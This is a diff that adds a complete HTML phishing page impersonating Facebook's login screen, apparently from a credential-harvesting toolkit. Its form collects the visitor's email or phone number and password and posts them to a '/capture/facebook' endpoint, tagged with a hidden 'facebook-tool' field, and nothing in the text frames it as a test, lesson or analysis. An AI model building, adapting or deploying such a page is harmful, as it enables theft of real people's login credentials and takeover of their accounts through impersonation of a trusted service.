@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Log in to Facebook</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif;}
+        body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
+        .card{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:100%;max-width:350px;text-align:center;}
+        .logo{color:#1877f2;font-size:36px;font-weight:bold;margin-bottom:20px;}
+        input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:12px;}
+        button{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;}
+        .footer{margin-top:15px;color:#65676b;font-size:12px;}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">facebook</div>
+        <form method="POST" action="/capture/facebook">
+            <input type="text" name="email" placeholder="Email or phone number" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <input type="hidden" name="tool" value="facebook-tool">
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer">Forgotten password? • Sign up</div>
+    </div>
+</body>
+</html>
